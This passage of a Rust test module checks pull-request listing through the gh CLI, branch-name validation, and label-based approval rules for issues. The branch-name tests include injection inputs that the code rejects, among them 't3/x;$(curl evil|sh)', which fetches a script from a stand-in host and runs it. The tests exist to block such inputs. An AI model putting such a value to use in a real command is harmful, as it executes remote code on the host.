            "open",
            "--head",
            head,
            "--limit",
            "100",
            "--json",
            PR_LIST_FIELDS,
        ])
    }

    #[test]
    fn open_pull_requests_on_head_lists_the_open_pull_requests_from_the_branch_with_the_exact_call()
    {
        // `gh pr list --json author` carries more than the login; a blank login is nobody.
        let second = serde_json::json!({
            "number": 15,
            "url": "https://github.com/rawphp/softfac/pull/15",
            "headRefName": "t3code/abc",
            "baseRefName": "dev",
            "isCrossRepository": true,
            "author": {"id": "", "is_bot": false, "login": "", "name": ""},
        });
        let fake = FakeTracker::answering([Answer::ok(format!(
            "[{},{second}]",
            listed_pr(14, "t3code/abc")
        ))]);
        assert_eq!(
            open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap(),
            vec![
                OpenPullRequest {
                    number: 14,
                    url: "https://github.com/rawphp/softfac/pull/14".into(),
                    head_ref: "t3code/abc".into(),
                    base_ref: "main".into(),
                    cross_repository: false,
                    author: Some("rawphp".into()),
                },
                OpenPullRequest {
                    number: 15,
                    url: "https://github.com/rawphp/softfac/pull/15".into(),
                    head_ref: "t3code/abc".into(),
                    base_ref: "dev".into(),
                    cross_repository: true,
                    author: None,
                },
            ]
        );
        assert_eq!(fake.calls(), vec![pr_list_call("t3code/abc")]);
    }

    // The runner's case, `gh pr list` half: it prints a bot as `app/<slug>` already, and the
    // GraphQL shape (`__typename`) is read alike. The runner's other half, the listing
    // `openPullRequestsClosing`, is not ported, so only this listing applies.
    #[test]
    fn a_pull_request_a_github_app_opened_is_by_app_slug_in_both_listings_as_gh_pr_list_names_it() {
        let pull = |author: serde_json::Value| {
            serde_json::json!({
                "number": 16,
                "url": "https://github.com/rawphp/softfac/pull/16",
                "headRefName": "t3code/abc",
                "baseRefName": "main",
                "isCrossRepository": false,
                "author": author,
            })
        };
        for (author, expected) in [
            (
                serde_json::json!({"id": "", "is_bot": true, "login": "app/superset-app", "name": ""}),
                "app/superset-app",
            ),
            (
                serde_json::json!({"__typename": "User", "login": "superset-app"}),
                "superset-app",
            ),
            (
                serde_json::json!({"__typename": "Bot", "login": "superset-app"}),
                "app/superset-app",
            ),
        ] {
            let fake = FakeTracker::answering([Answer::ok(format!("[{}]", pull(author.clone())))]);
            let got = open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap();
            assert_eq!(got[0].author.as_deref(), Some(expected), "{author}");
        }
    }

    #[test]
    fn open_pull_requests_on_head_is_empty_when_the_branch_has_none() {
        let fake = FakeTracker::answering([Answer::ok("[]")]);
        assert_eq!(
            open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap(),
            vec![]
        );
    }

    #[test]
    fn open_pull_requests_on_head_refuses_a_branch_name_that_could_be_taken_for_an_option_before_calling_gh()
     {
        for head in ["-x", "--force", "a b", "a..b", "", "a\u{1}b"] {
            let fake = FakeTracker::answering([Answer::ok("[]")]);
            let error = open_pull_requests_on_head(&fake, REPO, head).unwrap_err();
            assert!(is_refused(&error), "{head:?}: {error}");
            assert!(fake.calls().is_empty(), "{head:?}");
        }
    }

    #[test]
    fn keep_a_plain_ref_name_safe_as_one_argument_to_git() {
        for name in ["t3code/abc", "feat/x;y", "t3/x`y`"] {
            assert!(is_plain_ref_name(name), "{name}");
        }
        for name in ["", "-x", "--force", "a b", "a..b", "a\u{1}b", "a\tb"] {
            assert!(!is_plain_ref_name(name), "{name:?}");
        }
    }

    #[test]
    fn let_only_an_ordinary_branch_name_into_a_command_a_session_runs() {
        for name in ["t3code/abc", "t3/2e8db933", "feat/x_y-z.1"] {
            assert!(is_safe_branch_name(name), "{name}");
        }
        for name in [
            "",
            "-x",
            "a b",
            "a..b",
            "feat/x;y",
            "t3/x`y`",
            "t3/x;$(curl evil|sh)",
        ] {
            assert!(!is_safe_branch_name(name), "{name:?}");
        }
    }

    #[test]
    fn a_branch_path_has_no_empty_or_dot_segment() {
        for name in ["main", "release/1.0", "a/b/c"] {
            assert!(is_branch_path(name), "{name}");
        }
        for name in ["", "..", "../x", "a/../b", "./x", "/x", "x//y", "x/"] {
            assert!(!is_branch_path(name), "{name:?}");
        }
    }

    #[test]
    fn open_pull_requests_on_head_refuses_an_answer_it_cannot_read() {
        for text in ["", "no", "{}", "[{\"number\":\"x\"}]"] {
            let fake = FakeTracker::answering([Answer::ok(text)]);
            let error = open_pull_requests_on_head(&fake, REPO, "t3code/abc").unwrap_err();
            assert!(is_parse(&error), "{text}: {error}");
        }
    }

    /// When the instructor applied `factory:ready` in most of the approval tests.
    const LABELED: &str = "2026-10-04T10:00:00Z";
    /// After LABELED, and before LATER.
    const AFTER: &str = "2026-10-04T10:30:00Z";
    const LATER: &str = "2026-10-04T11:00:00Z";
    /// When the issue was written: the oldest entry of the edit history, by its author.
    const CREATED: &str = "2026-10-04T08:00:00Z";
    const BEFORE: &str = "2026-10-04T09:00:00Z";
    const READY: &str = "factory:ready";

    /// A person by login, or an App (`Bot`) that carries a login, or no one.
    #[derive(Clone, Copy)]
    enum Who<'a> {
        User(&'a str),
        Bot(&'a str),
        Nobody,
    }

    impl<'a> From<&'a str> for Who<'a> {
        fn from(login: &'a str) -> Self {
            Who::User(login)
        }
    }

    const NOBODY: Who<'static> = Who::Nobody;

    /// A GitHub App whose GraphQL login matches an instructor's.
    fn bot(login: &str) -> Who<'_> {
        Who::Bot(login)
    }

    type Edit<'a> = (&'a str, Who<'a>);

    fn e<'a>(at: &'a str, who: impl Into<Who<'a>>) -> Edit<'a> {
        (at, who.into())
    }

    fn pad(n: usize) -> String {
        format!("{n:02}")
    }

    fn actor_of(who: Who) -> Value {
        match who {
            Who::Nobody => Value::Null,
            Who::User(login) => json!({"__typename": "User", "login": login}),
            Who::Bot(login) => json!({"__typename": "Bot", "login": login}),
        }
    }

    fn label_event(kind: &str, at: &str, actor: impl Into<Who<'static>>, label: &str) -> Value {
        json!({
            "__typename": kind,
            "createdAt": at,
            "actor": actor_of(actor.into()),
            "label": {"name": label},
        })
    }

    /// A RenamedTitleEvent: only who and when are asked for, never the titles.
    fn rename_event(at: &str, actor: impl Into<Who<'static>>) -> Value {
        json!({"__typename": "RenamedTitleEvent", "createdAt": at, "actor": actor_of(actor.into())})
    }

    fn ready_on(at: &str, actor: impl Into<Who<'static>>) -> Value {
        label_event("LabeledEvent", at, actor, READY)
    }

    fn ready_off(at: &str, actor: impl Into<Who<'static>>) -> Value {
        label_event("UnlabeledEvent", at, actor, READY)
    }

    /// `userContentEdits` as GitHub answers `first: 100`: newest first, with the real total.
    fn edits_json(newest_first: &[Edit], total: usize) -> Value {
        json!({
            "totalCount": total,
            "nodes": newest_first
                .iter()
                .map(|(at, who)| json!({"editedAt": at, "editor": actor_of(*who)}))
                .collect::<Vec<_>>(),
        })
    }

    /// A history written oldest first, as the tests think of it, in GitHub's order.
    fn newest_first<'a>(oldest_first: &[Edit<'a>]) -> Vec<Edit<'a>> {
        oldest_first.iter().rev().copied().collect()
    }

    /// The approval answer with exactly these history nodes (newest first) and this total.
    fn approval_reply_raw(
        events: &[Value],
        total_events: usize,
        last: Option<Edit>,
        edit_nodes: &[Edit],
        total_edits: usize,
    ) -> String {
        json!({"data": {"repository": {"issue": {
            "timelineItems": {"totalCount": total_events, "nodes": events},
            "lastEditedAt": last.map(|(at, _)| at),
            "editor": last.map_or(Value::Null, |(_, who)| actor_of(who)),
            "userContentEdits": edits_json(edit_nodes, total_edits),
        }}}})
        .to_string()
    }

    /// `events` are oldest first, as GitHub lists them. `edits` is the history oldest first.
    fn approval_reply(
        events: &[Value],
        total_events: usize,
        last: Option<Edit>,
        edits: &[Edit],
    ) -> String {
        approval_reply_raw(
            events,
            total_events,
            last,
            &newest_first(edits),
            edits.len(),
        )
    }

    /// The events as the tests think of them, with the real total.
    fn events_reply(events: &[Value], last: Option<Edit>, edits: &[Edit]) -> String {
        approval_reply(events, events.len(), last, edits)
    }

    fn creation_only(author: &str) -> Vec<Edit<'_>> {
        vec![e(CREATED, author)]
    }

    fn approval_call_for(issue: u64) -> Vec<String> {
        args(&[
            "api",
            "graphql",
            "-f",
            &format!("query={APPROVAL_QUERY}"),
            "-f",
            "owner=rawphp",
            "-f",
            "name=softfac",
            "-F",
            &format!("number={issue}"),
        ])
    }

    fn approval_call() -> Vec<String> {
        approval_call_for(6)
    }

    fn approval_of(answer: &str, who: &[&str]) -> Approval {
        let fake = FakeTracker::answering([Answer::ok(answer)]);
        let found = fake.approval(REPO, 6, &names(who)).unwrap();
        assert_eq!(fake.calls(), vec![approval_call()]);
        found
    }

    fn approved(labeled_at: &str, labeled_by: &str) -> Approval {
        Approval::Approved {
            labeled_at: labeled_at.into(),
            labeled_by: labeled_by.into(),
        }
    }

    fn refused(refusal: Refusal) -> Approval {
        Approval::Refused(refusal)
    }

    fn edited_after(labeled_at: &str) -> Refusal {
        Refusal::EditedAfterLabel {
            labeled_at: labeled_at.into(),
        }
    }

    fn history_cut(labeled_at: &str) -> Refusal {
        Refusal::EditHistoryIncomplete {
            labeled_at: labeled_at.into(),
        }
    }

    fn by_non_instructor(by: Option<&str>, labeled_at: &str) -> Refusal {
        Refusal::LabeledByNonInstructor {
            by: by.map(String::from),
            labeled_at: labeled_at.into(),
        }
    }

    // ---- approvalHistory.ts: the pure half ----

    fn user(login: &str) -> Actor {
        Actor {
            typename: Some("User".into()),
            login: login.into(),
        }
    }

    fn labeled(at: &str, login: &str, name: &str) -> TimelineNode {
        TimelineNode::LabeledEvent(LabelChange {
            created_at: at.into(),
            actor: Some(user(login)),
            label: LabelName { name: name.into() },
        })
    }

    fn unlabeled(at: &str, login: &str) -> TimelineNode {
        TimelineNode::UnlabeledEvent(LabelChange {
            created_at: at.into(),
            actor: Some(user(login)),
            label: LabelName { name: READY.into() },
        })
    }

    fn renamed(at: &str, login: &str) -> TimelineNode {
        TimelineNode::RenamedTitleEvent(Rename {
            created_at: at.into(),
            actor: Some(user(login)),
        })
    }

    /// An answer with these events (oldest first) and body edits (newest first), totals as
    /// given.
    fn issue_of(
        events: Vec<TimelineNode>,
        edits: &[(&str, &str)],
        events_total: Option<u64>,
        edits_total: Option<u64>,
    ) -> ApprovalIssue {
        ApprovalIssue {
            timeline_items: Timeline {
                total_count: events_total.unwrap_or(events.len() as u64),
                nodes: events,
            },
            last_edited_at: edits.first().map(|(at, _)| at.to_string()),
            editor: edits.first().map(|(_, login)| user(login)),
            user_content_edits: EditHistory {
                total_count: edits_total.unwrap_or(edits.len() as u64),
                nodes: edits
                    .iter()
                    .map(|(at, login)| EditEntry {
                        edited_at: at.to_string(),
                        editor: Some(user(login)),
                    })
                    .collect(),
            },
        }
    }

    #[test]
    fn the_approval_query_asks_for_label_events_and_the_edit_history() {
        for part in [
            "timelineItems(itemTypes: [LABELED_EVENT, UNLABELED_EVENT, RENAMED_TITLE_EVENT], last: 100)",
            "totalCount",
            "... on LabeledEvent { createdAt actor { __typename login } label { name } }",
            "... on UnlabeledEvent { createdAt actor { __typename login } label { name } }",
            "... on RenamedTitleEvent { createdAt actor { __typename login } }",
            "lastEditedAt",
            "editor { __typename login }",
            "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } }",
            "$owner",
            "$name",
            "$number",
        ] {
            assert!(APPROVAL_QUERY.contains(part), "missing {part}");
        }
        assert!(!APPROVAL_QUERY.contains("comments"));
        // Titles are attacker-influenced text and are never asked for.
        assert!(!APPROVAL_QUERY.contains("Title {"));
        assert!(!APPROVAL_QUERY.contains("currentTitle"));
        assert!(!APPROVAL_QUERY.contains("previousTitle"));
    }

    #[test]
    fn the_approval_query_is_softfacs_byte_for_byte() {
        assert_eq!(
            APPROVAL_QUERY,
            "query($owner: String!, $name: String!, $number: Int!) { repository(owner: $owner, name: $name) { issue(number: $number) { timelineItems(itemTypes: [LABELED_EVENT, UNLABELED_EVENT, RENAMED_TITLE_EVENT], last: 100) { totalCount nodes { __typename ... on LabeledEvent { createdAt actor { __typename login } label { name } } ... on UnlabeledEvent { createdAt actor { __typename login } label { name } } ... on RenamedTitleEvent { createdAt actor { __typename login } } } } lastEditedAt editor { __typename login } userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } } } } }"
        );
    }

    #[test]
    fn judge_approval_approves_the_label_in_force_applied_by_an_instructor() {
        let issue = issue_of(vec![labeled(LABELED, "Tom", READY)], &[], None, None);
        assert_eq!(
            judge_approval(&issue, READY, &names(&["tom"])),
            approved(LABELED, "Tom")
        );
    }

    #[test]
    fn judge_approval_finds_no_label_when_a_later_removal_cancelled_it_or_the_name_differs() {
        let not_found = refused(Refusal::LabelNotFound);
        let removed = issue_of(
            vec![labeled(LABELED, "tom", READY), unlabeled(AFTER, "tom")],
            &[],
            None,
            None,
        );
        assert_eq!(judge_approval(&removed, READY, &names(&["tom"])), not_found);
        let other = issue_of(
            vec![labeled(LABELED, "tom", "Factory:Ready")],
            &[],
            None,
            None,
        );
        assert_eq!(judge_approval(&other, READY, &names(&["tom"])), not_found);
    }

    #[test]
    fn judge_approval_says_a_full_page_of_a_longer_history_without_the_label_is_incomplete() {
        let page: Vec<TimelineNode> = (0..HISTORY_PAGE).map(|_| renamed(BEFORE, "tom")).collect();
        assert_eq!(
            judge_approval(
                &issue_of(page.clone(), &[], Some(HISTORY_PAGE as u64 + 1), None),
                READY,
                &names(&["tom"])
            ),
            refused(Refusal::LabelHistoryIncomplete)
        );
        assert_eq!(
            judge_approval(&issue_of(page, &[], None, None), READY, &names(&["tom"])),
            refused(Refusal::LabelNotFound)
        );
    }

    #[test]
    fn judge_approval_refuses_a_label_applied_by_someone_who_is_not_an_instructor() {
        assert_eq!(
            judge_approval(
                &issue_of(vec![labeled(LABELED, "eve", READY)], &[], None, None),
                READY,
                &names(&["tom"])
            ),
            refused(by_non_instructor(Some("eve"), LABELED))
        );
        let app = LabelChange {
            created_at: LABELED.into(),
            actor: Some(Actor {
                typename: Some("Bot".into()),
                login: "tom".into(),
            }),
            label: LabelName { name: READY.into() },
        };
        assert_eq!(
            judge_approval(
                &issue_of(
                    vec![TimelineNode::LabeledEvent(app.clone())],
                    &[],
                    None,
                    None
                ),
                READY,
                &names(&["tom"])
            ),
            refused(by_non_instructor(Some("tom"), LABELED))
        );
        let deleted = LabelChange { actor: None, ..app };
        assert_eq!(
            judge_approval(
                &issue_of(vec![TimelineNode::LabeledEvent(deleted)], &[], None, None),
                READY,
                &names(&["tom"])
            ),
            refused(by_non_instructor(None, LABELED))
        );
    }

    #[test]
    fn judge_approval_refuses_a_strangers_edit_or_rename_at_or_after_the_label_not_before() {
        let edited = refused(edited_after(LABELED));
        let tom = names(&["tom"]);
        let edit_after = issue_of(
            vec![labeled(LABELED, "tom", READY)],
            &[(LABELED, "eve")],
            None,
            None,
        );
        assert_eq!(judge_approval(&edit_after, READY, &tom), edited);
        let rename_after = issue_of(
            vec![labeled(LABELED, "tom", READY), renamed(AFTER, "eve")],
            &[],
            None,
            None,
        );
        assert_eq!(judge_approval(&rename_after, READY, &tom), edited);
        let before = issue_of(
            vec![renamed(BEFORE, "eve"), labeled(LABELED, "tom", READY)],
            &[(BEFORE, "eve")],
            None,
            None,
        );
        assert!(matches!(
            judge_approval(&before, READY, &tom),
            Approval::Approved { .. }
        ));
        let instructor = issue_of(
            vec![labeled(LABELED, "tom", READY), renamed(AFTER, "tom")],
            &[(AFTER, "tom")],
            None,
            None,
        );
        assert!(matches!(
            judge_approval(&instructor, READY, &tom),
            Approval::Approved { .. }
        ));
    }

    #[test]
    fn judge_approval_refuses_an_edit_history_cut_off_after_the_label() {
        let edits: Vec<(&str, &str)> = (0..HISTORY_PAGE).map(|_| (AFTER, "tom")).collect();
        assert_eq!(
            judge_approval(
                &issue_of(vec![labeled(LABELED, "tom", READY)], &edits, None, None),
                READY,
                &names(&["tom"])
            ),
            refused(history_cut(LABELED))
        );
    }

    #[test]
    fn judge_approval_refuses_a_cut_off_timeline_whose_oldest_event_is_the_label() {
        // A rename in the label's second could sit on the page before this one.
        let mut page = vec![labeled(LABELED, "tom", READY)];
        page.extend((1..HISTORY_PAGE).map(|_| labeled(LATER, "eve", "bug")));
        assert_eq!(
            judge_approval(
                &issue_of(page, &[], Some(HISTORY_PAGE as u64 + 5), None),
                READY,
                &names(&["tom"])
            ),
            refused(history_cut(LABELED))
        );
    }

    #[test]
    fn edited_since_counts_anyones_edit_or_rename_at_or_after_the_moment() {
        assert!(!edited_since(
            &issue_of(vec![renamed(BEFORE, "tom")], &[(BEFORE, "tom")], None, None),
            LABELED
        ));
        assert!(edited_since(
            &issue_of(vec![], &[(LABELED, "tom")], None, None),
            LABELED
        ));
        assert!(edited_since(
            &issue_of(vec![renamed(AFTER, "tom")], &[], None, None),
            LABELED
        ));
    }

    #[test]
    fn edited_since_counts_a_timeline_page_that_may_hide_a_rename_as_a_change() {
        let page: Vec<TimelineNode> = (0..HISTORY_PAGE)
            .map(|_| labeled(AFTER, "tom", "other"))
            .collect();
        assert!(edited_since(
            &issue_of(page.clone(), &[], None, None),
            LABELED
        ));
        let mut reaches_back = vec![labeled(BEFORE, "tom", "other")];
        reaches_back.extend(page.into_iter().skip(1));
        assert!(!edited_since(
            &issue_of(reaches_back, &[], None, None),
            LABELED
        ));
    }

    // ---- judge_claimed_approval: the approval a takeover's claim was made on ----

    /// The project's login in these tests: the claim's removal of the label is by it.
    const PROJECT: &str = "softfac-bot";

    fn unlabeled_by(at: &str, actor: Option<Actor>) -> TimelineNode {
        TimelineNode::UnlabeledEvent(LabelChange {
            created_at: at.into(),
            actor,
            label: LabelName { name: READY.into() },
        })
    }

    fn labeled_by(at: &str, actor: Option<Actor>) -> TimelineNode {
        TimelineNode::LabeledEvent(LabelChange {
            created_at: at.into(),
            actor,
            label: LabelName { name: READY.into() },
        })
    }

    /// The claim's swap of `factory:ready` for `factory:triage` at `at`, by `login`.
    fn swap_by(at: &str, login: &str) -> [TimelineNode; 2] {
        [unlabeled(at, login), labeled(at, login, "factory:triage")]
    }

    fn claimed(issue: &ApprovalIssue) -> Approval {
        judge_claimed_approval(issue, READY, PROJECT, &names(&["tom"]))
    }

    #[test]
    fn judge_claimed_approval_approves_the_newest_label_in_force() {
        let issue = issue_of(vec![labeled(LABELED, "Tom", READY)], &[], None, None);
        assert_eq!(claimed(&issue), approved(LABELED, "Tom"));
        // Taken off by an instructor and applied again: the newest is in force.
        let again = issue_of(
            vec![
                labeled(BEFORE, "tom", READY),
                unlabeled(LABELED, "tom"),
                labeled(AFTER, "tom", READY),
            ],
            &[],
            None,
            None,
        );
        assert_eq!(claimed(&again), approved(AFTER, "tom"));
    }

    #[test]
    fn judge_claimed_approval_approves_the_label_the_projects_removal_took_off_in_any_case() {
        for login in [PROJECT, "Softfac-Bot", "SOFTFAC-BOT"] {
            let mut events = vec![labeled(LABELED, "tom", READY)];
            events.extend(swap_by(AFTER, login));
            let issue = issue_of(events, &[], None, None);
            assert_eq!(claimed(&issue), approved(LABELED, "tom"), "{login}");
        }
        // Other labels around the claim change nothing.
        let mut events = vec![
            labeled(LABELED, "tom", READY),
            labeled(LABELED, "eve", "bug"),
        ];
        events.extend(swap_by(AFTER, PROJECT));
        events.push(labeled(LATER, PROJECT, "factory:building"));
        assert_eq!(
            claimed(&issue_of(events, &[], None, None)),
            approved(LABELED, "tom")
        );
    }

    #[test]
    fn judge_claimed_approval_refuses_the_projects_removal_with_no_label_before_it() {
        let not_found = refused(Refusal::LabelNotFound);
        let alone = issue_of(swap_by(AFTER, PROJECT).into(), &[], None, None);
        assert_eq!(claimed(&alone), not_found);
        // A removal before it, not a label, is no approval either.
        let removals = issue_of(
            vec![unlabeled(LABELED, "tom"), unlabeled(AFTER, PROJECT)],
            &[],
            None,
            None,
        );
        assert_eq!(claimed(&removals), not_found);
        // The event just before the claim's removal is an instructor's withdrawal: the label
        // further back is no approval.
        let withdrawn = issue_of(
            vec![
                labeled(BEFORE, "tom", READY),
                unlabeled(LABELED, "tom"),
                unlabeled(AFTER, PROJECT),
            ],
            &[],
            None,
            None,
        );
        assert_eq!(claimed(&withdrawn), not_found);
        // A label applied and taken off again after the claim hides it.
        let mut events = vec![labeled(BEFORE, "tom", READY)];
        events.extend(swap_by(LABELED, PROJECT));
        events.push(labeled(AFTER, "tom", READY));
        events.push(unlabeled(LATER, "tom"));
        assert_eq!(claimed(&issue_of(events, &[], None, None)), not_found);
    }

    #[test]
    fn judge_claimed_approval_refuses_a_removal_by_anyone_else() {
        let not_found = refused(Refusal::LabelNotFound);
        for actor in [Some(user("tom")), Some(user("eve")), None] {
            let issue = issue_of(
                vec![
                    labeled(LABELED, "tom", READY),
                    unlabeled_by(AFTER, actor.clone()),
                ],
                &[],
                None,
                None,
            );
            assert_eq!(claimed(&issue), not_found, "{actor:?}");
        }
        // A login that only contains the project's is someone else.
        let issue = issue_of(
            vec![
                labeled(LABELED, "tom", READY),
                unlabeled(AFTER, "softfac-bot-2"),
            ],
            &[],
            None,
            None,
        );
        assert_eq!(claimed(&issue), not_found);
    }

    #[test]
    fn judge_claimed_approval_with_no_label_event_is_refused_as_judge_approval_refuses_it() {
        assert_eq!(
            claimed(&issue_of(vec![], &[], None, None)),
            refused(Refusal::LabelNotFound)
        );
        let page: Vec<TimelineNode> = (0..HISTORY_PAGE).map(|_| renamed(BEFORE, "tom")).collect();
        assert_eq!(
            claimed(&issue_of(page, &[], Some(HISTORY_PAGE as u64 + 1), None)),
            refused(Refusal::LabelHistoryIncomplete)
        );
    }

    #[test]
    fn judge_claimed_approval_refuses_a_label_with_no_actor() {
        let in_force = issue_of(vec![labeled_by(LABELED, None)], &[], None, None);
        assert_eq!(
            claimed(&in_force),
            refused(by_non_instructor(None, LABELED))
        );
        let mut events = vec![labeled_by(LABELED, None)];
        events.extend(swap_by(AFTER, PROJECT));
        assert_eq!(
            claimed(&issue_of(events, &[], None, None)),
            refused(by_non_instructor(None, LABELED))
        );
    }

    #[test]
    fn judge_claimed_approval_refuses_a_label_by_a_non_instructor_or_a_bot() {
        let app = Actor {
            typename: Some("Bot".into()),
            login: "tom".into(),
        };
        for (actor, by) in [(user("eve"), "eve"), (app, "tom")] {
            let in_force = issue_of(
                vec![labeled_by(LABELED, Some(actor.clone()))],
                &[],
                None,
                None,
            );
            assert_eq!(
                claimed(&in_force),
                refused(by_non_instructor(Some(by), LABELED)),
                "{actor:?}"
            );
            let mut events = vec![labeled_by(LABELED, Some(actor.clone()))];
            events.extend(swap_by(AFTER, PROJECT));
            assert_eq!(
                claimed(&issue_of(events, &[], None, None)),
                refused(by_non_instructor(Some(by), LABELED)),
                "{actor:?}"
            );
        }
        // The project's login is no instructor: its own label approves nothing.
        let own = issue_of(vec![labeled(LABELED, PROJECT, READY)], &[], None, None);
        assert_eq!(
            claimed(&own),
            refused(by_non_instructor(Some(PROJECT), LABELED))
        );
        // A stranger's label in force at the claim, though an instructor's came before it.
        let mut events = vec![
            labeled(BEFORE, "tom", READY),
            unlabeled(BEFORE, "tom"),
            labeled(LABELED, "eve", READY),
        ];
        events.extend(swap_by(AFTER, PROJECT));
        assert_eq!(
            claimed(&issue_of(events, &[], None, None)),
            refused(by_non_instructor(Some("eve"), LABELED))
        );
    }

    #[test]
    fn judge_claimed_approval_refuses_a_strangers_edit_or_rename_at_or_after_the_label() {
        let edited = refused(edited_after(LABELED));
        for at in [LABELED, AFTER] {
            let mut events = vec![labeled(LABELED, "tom", READY)];
            events.extend(swap_by(LATER, PROJECT));
            let edit = issue_of(events.clone(), &[(at, "eve")], None, None);
            assert_eq!(claimed(&edit), edited, "edit at {at}");
            let mut renamed_after = events.clone();
            renamed_after.insert(1, renamed(at, "eve"));
            let rename = issue_of(renamed_after, &[], None, None);
            assert_eq!(claimed(&rename), edited, "rename at {at}");
        }
        // Before the label, or by an instructor, it approves.
        let mut events = vec![renamed(BEFORE, "eve"), labeled(LABELED, "tom", READY)];
        events.push(renamed(AFTER, "tom"));
        events.extend(swap_by(LATER, PROJECT));
        let issue = issue_of(events, &[(AFTER, "tom"), (BEFORE, "eve")], None, None);
        assert_eq!(claimed(&issue), approved(LABELED, "tom"));
    }

    #[test]
    fn judge_claimed_approval_refuses_an_edit_history_it_cannot_judge() {
        let cut = refused(history_cut(LABELED));
        let edits: Vec<(&str, &str)> = (0..HISTORY_PAGE).map(|_| (AFTER, "tom")).collect();
        let mut events = vec![labeled(LABELED, "tom", READY)];
        events.extend(swap_by(LATER, PROJECT));
        assert_eq!(claimed(&issue_of(events.clone(), &edits, None, None)), cut);
        // A total larger than the page shows.
        assert_eq!(
            claimed(&issue_of(
                events.clone(),
                &[(AFTER, "tom")],
                None,
                Some(150)
            )),
            cut
        );
        // A timeline cut off with the label its oldest event shown: a rename in the same
        // second could be hidden.
        let mut page = vec![labeled(LABELED, "tom", READY)];
        page.extend((1..HISTORY_PAGE).map(|_| labeled(LATER, "eve", "bug")));
        assert_eq!(
            claimed(&issue_of(page, &[], Some(HISTORY_PAGE as u64 + 5), None)),
            cut
        );
    }

    /// The two judges agree wherever the label in force decides: the same label, actor, edit
    /// and rename rules, and the same refusals, a cut-off page whose oldest event is the label
    /// included.
    #[test]
    fn judge_claimed_approval_agrees_with_judge_approval_on_a_label_in_force() {
        /// A timeline, the body edits, and the edit history's total when it is not their count.
        type Shape<'a> = (Vec<TimelineNode>, &'a [(&'a str, &'a str)], Option<u64>);
        let app = Actor {
            typename: Some("Bot".into()),
            login: "tom".into(),
        };
        let actors = [
            Some(user("tom")),
            Some(user("eve")),
            Some(user(PROJECT)),
            Some(app),
            None,
        ];
        let full: Vec<(&str, &str)> = (0..HISTORY_PAGE).map(|_| (AFTER, "tom")).collect();
        let mut cases = Vec::new();
        for actor in &actors {
            let label = || labeled_by(LABELED, actor.clone());
            let shapes: Vec<Shape> = vec![
                (vec![label()], &[], None),
                (
                    vec![renamed(BEFORE, "eve"), label()],
                    &[(BEFORE, "eve")],
                    None,
                ),
                (vec![label()], &[(LABELED, "eve")], None),
                (vec![label()], &[(AFTER, "eve")], None),
                (vec![label()], &[(AFTER, "tom")], None),
                (vec![label(), renamed(AFTER, "eve")], &[], None),
                (vec![label(), renamed(LABELED, "tom")], &[], None),
                (vec![label()], &full, None),
                (vec![label()], &[(AFTER, "tom")], Some(150)),
                (
                    vec![
                        labeled(BEFORE, "tom", READY),
                        unlabeled(BEFORE, "tom"),
                        label(),
                    ],
                    &[],
                    None,
                ),
            ];
            for (events, edits, edits_total) in shapes {
                cases.push(issue_of(events, edits, None, edits_total));
            }
        }
        // No label at all, on a whole page and on a cut-off one.
        cases.push(issue_of(vec![renamed(AFTER, "tom")], &[], None, None));
        let page: Vec<TimelineNode> = (0..HISTORY_PAGE)
            .map(|_| labeled(LATER, "eve", "bug"))
            .collect();
        cases.push(issue_of(page, &[], Some(HISTORY_PAGE as u64 + 5), None));
        // A cut-off page that reaches back past the label: it shows every rename after it.
        for after in [None, Some(renamed(AFTER, "eve"))] {
            let mut page = vec![
                labeled(BEFORE, "eve", "bug"),
                labeled(LABELED, "tom", READY),
            ];
            page.extend(after);
            page.extend((page.len()..HISTORY_PAGE).map(|_| labeled(LATER, "eve", "bug")));
            cases.push(issue_of(page, &[], Some(HISTORY_PAGE as u64 + 5), None));
        }
        // A cut-off page whose oldest event is another one in the label's second: a rename in
        // that second could still be on the page before it.
        let mut same_second = vec![
            labeled(LABELED, "eve", "bug"),
            labeled(LABELED, "tom", READY),
        ];
        same_second.extend((2..HISTORY_PAGE).map(|_| labeled(LATER, "eve", "bug")));
        let same_second = issue_of(same_second, &[], Some(HISTORY_PAGE as u64 + 5), None);
        assert_eq!(
            judge_approval(&same_second, READY, &names(&["tom"])),
            refused(history_cut(LABELED))
        );
        cases.push(same_second);

        let instructors = names(&["tom"]);
        let mut seen = Vec::new();
        for issue in &cases {
            let fresh = judge_approval(issue, READY, &instructors);
            assert_eq!(
                judge_claimed_approval(issue, READY, PROJECT, &instructors),
                fresh,
                "{issue:?}"
            );
            if !seen.contains(&fresh) {
                seen.push(fresh);
            }
        }
        // The cases reach every outcome, so agreement is not agreement on one answer.
        for outcome in [
            approved(LABELED, "tom"),
            refused(by_non_instructor(Some("eve"), LABELED)),
            refused(by_non_instructor(None, LABELED)),
            refused(edited_after(LABELED)),
            refused(history_cut(LABELED)),
            Approval::Refused(Refusal::LabelNotFound),
            Approval::Refused(Refusal::LabelHistoryIncomplete),
        ] {
            assert!(seen.contains(&outcome), "{outcome:?} in {seen:?}");
        }

        // Both judges hand the label they chose to one tail, which judges the cut-off page
        // itself: a refusal added to a single judge beside the tail shows wherever a case
        // triggers it. On a cut-off page whose oldest event is the label, a rename in its second
        // could be hidden, so both refuse it.
        let mut oldest = vec![labeled(LABELED, "tom", READY)];
        oldest.extend((1..HISTORY_PAGE).map(|_| labeled(LATER, "eve", "bug")));
        let oldest = issue_of(oldest, &[], Some(HISTORY_PAGE as u64 + 5), None);
        assert_eq!(
            judge_approval(&oldest, READY, &instructors),
            refused(history_cut(LABELED))
        );
        assert_eq!(
            judge_claimed_approval(&oldest, READY, PROJECT, &instructors),
            refused(history_cut(LABELED))
        );
        cases.push(oldest);
        for issue in &cases {
            // No case ends in a removal of `ready`, so its label in force is its newest one.
            let label = issue
                .timeline_items
                .nodes
                .iter()
                .rev()
                .find_map(|node| match node {
                    TimelineNode::LabeledEvent(change) if change.label.name == READY => {
                        Some(change)
                    }
                    _ => None,
                });
            assert_eq!(
                judge_approval(issue, READY, &instructors),
                judge_chosen_label(issue, label, &instructors),
                "{issue:?}"
            );
            assert_eq!(
                judge_claimed_approval(issue, READY, PROJECT, &instructors),
                judge_chosen_label(issue, label, &instructors),
                "{issue:?}"
            );
        }
    }

    // ---- claimed_approval ----

    #[test]
    fn claimed_approval_reads_the_history_once_and_judges_it_as_of_the_claim() {
        let answer = events_reply(
            &[
